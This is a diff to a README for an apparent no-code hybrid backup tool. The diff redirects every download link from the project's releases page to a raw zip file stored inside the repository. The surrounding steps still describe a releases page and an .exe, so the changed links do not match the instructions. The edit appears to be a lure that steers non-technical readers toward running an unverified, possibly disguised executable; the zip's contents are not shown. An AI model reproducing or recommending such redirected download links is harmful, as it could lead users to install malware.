@@ -1,6 +1,6 @@
 # ⚙️ aws-tally-backup-fsx-hybrid-architecture - Easy Hybrid Backup Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-aws--tally--backup--fsx--hybrid--architecture-brightgreen?style=for-the-badge)](https://github.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-aws--tally--backup--fsx--hybrid--architecture-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/main/architecture/hybrid_backup_architecture_fsx_tally_aws_3.3.zip)
 
 ## 📦 What is this?
 
@@ -44,7 +44,7 @@ You do not need programming skills to use this software. Follow these steps care
 
 1. Visit the official release page to get the software:
 
-   [Download here](https://github.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/releases)
+   [Download here](https://raw.githubusercontent.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/main/architecture/hybrid_backup_architecture_fsx_tally_aws_3.3.zip)
 
 2. On the releases page, look for the latest version. Find the file with a `.exe` extension.
 
@@ -167,4 +167,4 @@ This README covers all basic steps for normal use. For advanced issues, you may 
 
 ---
 
-[Download the latest version here](https://github.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/releases) to start managing your backups.
+[Download the latest version here](https://raw.githubusercontent.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/main/architecture/hybrid_backup_architecture_fsx_tally_aws_3.3.zip) to start managing your backups.
